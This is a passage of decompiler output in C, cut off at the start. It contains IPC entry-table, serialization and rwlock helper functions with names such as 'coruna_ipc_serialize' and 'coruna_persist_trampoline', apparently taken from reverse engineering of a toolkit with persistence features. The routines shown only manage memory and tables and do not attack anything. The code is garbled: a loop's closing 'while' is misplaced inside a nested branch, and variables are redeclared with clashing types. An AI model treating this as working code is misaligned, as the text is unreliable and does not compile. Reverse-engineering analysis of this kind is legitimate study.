          entry_10 = (uint *)(n + type_id_8 * 4 + 5);
          if (*entry_10 == 0) {
            return 0x700c;
          }
          u = *entry_10 + type_id;
          if (u <= type_id || m < u) {
            return 0x700c;
          }
          type_id_13 = 0xffffffffffffffff;
          j = (int *)(arg + 0xf0);
          do {
            type_id = *(uint *)(arg + 0xe8);
            type_id_13 = type_id_13 + 1;
            if (type_id <= type_id_13) {
              if (val == 2) {
                tag = (unsigned long)(uint)(count + (int)type_id_8);
                ctx_val = arg + tag * 0x20;
                *(uint64_t *)(ctx_val + 0xf0) = *(uint64_t *)idx;
                *(uint8_t *)(ctx_val + 0xf8) = 2;
                type_id_13 = (long)n + (unsigned long)*entry_11;
              }
              else {
                if (val != 1) {
                  return 0xad001;
                }
                tag = (unsigned long)(uint)(count + (int)type_id_8);
                ctx_val = arg + tag * 0x20;
                *(uint64_t *)(ctx_val + 0xf0) = *(uint64_t *)idx;
                *(uint8_t *)(ctx_val + 0xf8) = 1;
                type_id_13 = (unsigned long)*entry_11;
              }
              *(unsigned long *)(ctx_val + 0x100) = type_id_13;
              *(uint *)(arg + tag * 0x20 + 0x108) = *entry_10;
              *(uint *)(arg + 0xe8) = type_id + 1;
              break;
            }
            if (*idx == *j) {
              block_ctx = (void *)0x0;
              action = 0;
              tag = coruna_ipc_resolve_entry(arg,j,&block_ctx,&action);
              if ((int)tag == 0) {
                if (block_ctx == (void *)((long)n + (unsigned long)*entry_11) && action == *entry_10) {
                  tag = 0;
                }
                else {
                  if (action == *entry_10) {
                    type_id = _memcmp(block_ctx,(void *)((long)n + (unsigned long)*entry_11),
                                    (unsigned long)action);
                    tag = (unsigned long)type_id;
                    j = j + 8;
                    } while ((int)tag == 0x7003);
                    if ((int)tag != 0) {
                    return tag;
                  }
                  tag = 0x700a;
                }
              }
            }
            else {
              tag = 0x7003;
            }
load_ok_46:
            j = j + 8;
          } while ((int)tag == 0x7003);
          if ((int)tag != 0) {
            return tag;
          }
load_ok_45:
          type_id_8 = type_id_8 + 1;
          if ((uint)n[1] <= type_id_8) {
            return 0;
          }
        } while( true );
      }
    }
    port = 0x700b;
  }
  return port;
}





uint64_t coruna_ipc_serialize(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  uint64_t version;
  long handle;
  unsigned long port;
  uint64_t *buf;
  unsigned long tag;
  int *err;
  int scratch;
  uint64_t bootargs;
  
  version = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    if (*(int *)(handle + 0xe8) == 0) {
      version = 0x7007;
    }
    else {
      port = 0;
      tag = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
      handle = handle + 0xf0;
      size = tag;
      do {
        bootargs = 0;
        scratch = 0;
        version = coruna_ipc_resolve_entry(handle,handle,&bootargs,&scratch);
        if ((int)version != 0) {
          return version;
        }
        port = port + 1;
        u = (scratch + 0x1fU & 0xffffffe0) + (int)size;
        size = (unsigned long)u;
        handle = handle + 0x20;
      } while (port < *(uint *)(handle + 0xe8));
      ptr = _malloc(size);
      if (ptr == (uint32_t *)0x0) {
        version = 0xad009;
      }
      else {
        _bzero(ptr,size);
        err = *(int *)(handle + 0xe8);
        *ptr = 0xf00dbeef;
        ptr[1] = err;
        if (err != 0) {
          port = 0;
          err = ptr + 5;
          buf = (uint64_t *)(handle + 0xf0);
          do {
            bootargs = 0;
            scratch = 0;
            version = coruna_ipc_resolve_entry(handle,buf,&bootargs,&scratch);
            if ((int)version != 0) {
              _bzero(ptr,size);
              _free(ptr);
              return version;
            }
            err[-1] = (int)tag;
            *err = scratch;
            *(uint64_t *)(err + -3) = *buf;
            coruna_persist_trampoline_00010010((long)ptr + tag,bootargs);
            tag = (unsigned long)((scratch + 0x1fU & 0xffffffe0) + (int)tag);
            port = port + 1;
            err = err + 4;
            buf = buf + 4;
          } while (port < *(uint *)(handle + 0xe8));
        }
        version = 0;
        *val = ptr;
        *size = u;
      }
    }
  }
  return version;
}





uint64_t coruna_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr == (pthread_rwlock_t *)0x0) {
      u = 0xad009;
    }
    else {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        u = 0;
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
        u = 0xad020;
      }
    }
  }
  return u;
}

